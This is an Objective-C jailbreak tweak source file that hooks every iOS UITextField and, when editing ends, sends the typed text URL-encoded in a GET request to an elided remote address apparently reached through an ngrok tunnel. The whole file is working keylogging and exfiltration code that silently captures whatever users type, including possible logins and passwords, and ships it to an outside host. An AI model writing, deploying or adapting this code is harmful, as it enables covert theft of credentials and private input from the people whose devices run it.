#import <UIKit/UIKit.h>

%hook UITextField

-(void)didMoveToWindow {
	// self.backgroundColor = [UIColor redColor];
	[self addTarget:self action:@selector(yourHandler:) forControlEvents:UIControlEventEditingDidEnd];
	%orig;
}

%new
- (void)yourHandler:(UITextField *)textField {
	NSString *baseURL = @"https://..............";
	NSString *letters = textField.text;
	NSString *encodedLetters = [letters stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];

	NSString *fullURL = [baseURL stringByAppendingFormat:@"?user=%@", encodedLetters];
	NSURL *finalURL = [NSURL URLWithString:fullURL];

	NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:finalURL];
	[request setHTTPMethod:@"GET"];
	[request setValue:@"ngrok-skip-browser-warning" forHTTPHeaderField:@"ngrok-skip-browser-warning"];
	NSURLSession *session = [NSURLSession sharedSession];
	NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                                          // Check for errors
                                          if (error) {
                                            NSLog(@"Error: %@", error);
                                          } else {
                                            // Parse the response data
                                            NSDictionary *responseDict = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                                            // Print the response
                                            NSLog(@"Response: %@", responseDict);
                                          }
                                        }];
	// Send the request
	[task resume];
}

%end

